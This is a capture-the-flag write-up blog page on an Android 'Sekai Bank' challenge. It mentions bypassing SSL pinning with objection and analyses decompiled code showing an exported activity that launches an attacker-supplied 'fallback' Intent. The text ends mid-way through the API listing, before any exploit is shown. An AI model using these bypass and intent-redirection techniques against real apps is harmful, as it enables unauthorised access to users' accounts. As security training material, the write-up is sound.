<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Sekai 2025 Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="Signature SSL Pinning" />
<meta property="og:description" content="Signature SSL Pinning" />
<link rel="canonical" href="http://localhost:4000/posts/Sekai-CTF-2025/" />
<meta property="og:url" content="http://localhost:4000/posts/Sekai-CTF-2025/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-16T09:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Sekai 2025 Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-16T09:00:00+09:00","datePublished":"2025-08-16T09:00:00+09:00","description":"Signature SSL Pinning","headline":"Sekai 2025 Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Sekai-CTF-2025/"},"url":"http://localhost:4000/posts/Sekai-CTF-2025/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Sekai 2025 Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Sekai 2025 Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Sekai 2025 Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1755302400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug 16, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3840 words"
>
  <em>21 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="signature"><span class="me-2">Signature</span><a href="#signature" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="ssl-pinning"><span class="me-2">SSL Pinning</span><a href="#ssl-pinning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/2025/sekaiCTF/1.png" class="popup img-link  shimmer"><img src="/assets/img/2025/sekaiCTF/1.png" alt="" loading="lazy"></a></p>

<p>before solving this challenge, we have to bypass SSL Pinning, i have bypass via objection</p>

<h3 id="analysis"><span class="me-2">Analysis</span><a href="#analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>        <span class="nt">&lt;activity</span>
            <span class="na">android:theme=</span><span class="s">"@style/Theme.SekaiBank.NoActionBar"</span>
            <span class="na">android:name=</span><span class="s">"com.sekai.bank.MainActivity"</span>
            <span class="na">android:exported=</span><span class="s">"true"</span>
            <span class="na">android:windowSoftInputMode=</span><span class="s">"adjustPan"</span>
            <span class="na">android:preferMinimalPostProcessing=</span><span class="s">"true"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        
        <span class="nt">&lt;activity</span>
            <span class="na">android:theme=</span><span class="s">"@style/Theme.SekaiBank.Auth"</span>
            <span class="na">android:name=</span><span class="s">"com.sekai.bank.ui.auth.AuthActivity"</span>
            <span class="na">android:exported=</span><span class="s">"false"</span>
            <span class="na">android:windowSoftInputMode=</span><span class="s">"adjustPan"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;activity</span>
            <span class="na">android:theme=</span><span class="s">"@style/Theme.SekaiBank.NoActionBar"</span>
            <span class="na">android:name=</span><span class="s">"com.sekai.bank.ui.pin.PinActivity"</span>
            <span class="na">android:exported=</span><span class="s">"false"</span>
            <span class="na">android:windowSoftInputMode=</span><span class="s">"adjustPan"</span><span class="nt">/&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p>there are 3 activities called MainActivity, AuthActivity, PinActivity and only MainActivity is allowed so i started analyzing the code of MainActivity</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">bundle</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">tokenManager</span> <span class="o">=</span> <span class="nc">SekaiApplication</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">getTokenManager</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">handlePinSetupFlow</span><span class="o">())</span> <span class="o">{</span>
                <span class="k">return</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Intent</span><span class="o">)</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"fallback"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">intent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
                <span class="n">finish</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">uiInitialized</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">checkAuthentication</span><span class="o">();</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>checkAuthentication() method will call if handlePinSetupFlow() will return False</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">checkAuthentication</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">isAuthenticating</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">this</span><span class="o">.</span><span class="na">isAuthenticating</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">tokenManager</span><span class="o">.</span><span class="na">isTokenValid</span><span class="o">().</span><span class="na">thenAccept</span><span class="o">(</span><span class="k">new</span> <span class="nc">Consumer</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: com.sekai.bank.MainActivity$$ExternalSyntheticLambda2</span>
            <span class="nd">@Override</span> <span class="c1">// java.util.function.Consumer</span>
            <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">accept</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">MainActivity</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">m209lambda</span><span class="n">$checkAuthentication</span><span class="err">$</span><span class="mi">1</span><span class="n">$comsekaibankMainActivity</span><span class="o">((</span><span class="nc">Boolean</span><span class="o">)</span> <span class="n">obj</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}).</span><span class="na">exceptionally</span><span class="o">(</span><span class="k">new</span> <span class="nc">Function</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: com.sekai.bank.MainActivity$$ExternalSyntheticLambda3</span>
            <span class="nd">@Override</span> <span class="c1">// java.util.function.Function</span>
            <span class="kd">public</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="nf">apply</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">return</span> <span class="nc">MainActivity</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">m210lambda</span><span class="n">$checkAuthentication</span><span class="err">$</span><span class="mi">2</span><span class="n">$comsekaibankMainActivity</span><span class="o">((</span><span class="nc">Throwable</span><span class="o">)</span> <span class="n">obj</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">});</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the checkAuthentication() method will just call the comsekaibankMainActivity() method</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>    <span class="kd">public</span> <span class="cm">/* synthetic */</span> <span class="kt">void</span> <span class="n">m208lambda$checkAuthentication</span><span class="err">$</span><span class="mi">0</span><span class="n">$comsekaibankMainActivity</span><span class="o">(</span><span class="nc">Boolean</span> <span class="n">bool</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">bool</span><span class="o">.</span><span class="na">booleanValue</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">startPinVerification</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">startAuthActivity</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>the comsekaibankMainActivity() method seems to display either the login/register ui or the pin code ui to the user</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">verifyPin</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">setLoadingState</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">apiService</span><span class="o">.</span><span class="na">verifyPin</span><span class="o">(</span><span class="k">new</span> <span class="nc">PinRequest</span><span class="o">(</span><span class="n">str</span><span class="o">)).</span><span class="na">enqueue</span><span class="o">(</span><span class="k">new</span> <span class="nc">AnonymousClass1</span><span class="o">());</span>
    <span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>and when the user enters a pin code then submit, the application verifies the code using the verifyPin() method</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre>    <span class="nd">@PUT</span><span class="o">(</span><span class="s">"auth/pin/change"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">Void</span><span class="o">&gt;&gt;</span> <span class="nf">changePin</span><span class="o">(</span><span class="nd">@Body</span> <span class="nc">PinRequest</span> <span class="n">pinRequest</span><span class="o">);</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"user/search/{username}"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">User</span><span class="o">&gt;&gt;</span> <span class="nf">findUserByUsername</span><span class="o">(</span><span class="nd">@Path</span><span class="o">(</span><span class="s">"username"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">str</span><span class="o">);</span>

    <span class="nd">@GET</span><span class="o">(</span><span class="s">"user/balance"</span><span class="o">)</span>
    <span class="nc">Call</span><span class="o">&lt;</span><span class="nc">ApiResponse</span><span class="o">&lt;</span><span class="nc">BalanceResponse</span><span class="o">&gt;&gt;</span> <span class="nf">getBalance</span><span class="o">();</span>

